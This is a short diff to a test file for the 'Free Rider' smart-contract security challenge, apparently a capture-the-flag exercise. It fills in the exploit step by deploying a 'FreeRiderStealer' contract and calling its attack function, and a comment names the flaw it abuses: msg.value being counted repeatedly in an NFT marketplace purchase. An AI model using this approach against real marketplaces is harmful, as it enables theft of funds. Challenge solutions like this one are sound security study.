@@ -105,6 +105,18 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        //msg.value is used multiple times in _buyOne
+
+        const stealer = await (await ethers.getContractFactory("FreeRiderStealer", deployer)).deploy(
+            this.marketplace.address,
+            this.uniswapPair.address,
+            this.nft.address,
+            this.weth.address,
+            attacker.address,
+            this.buyerContract.address
+        );
+
+        await stealer.connect(attacker).attack();
     });
 
     after(async function () {
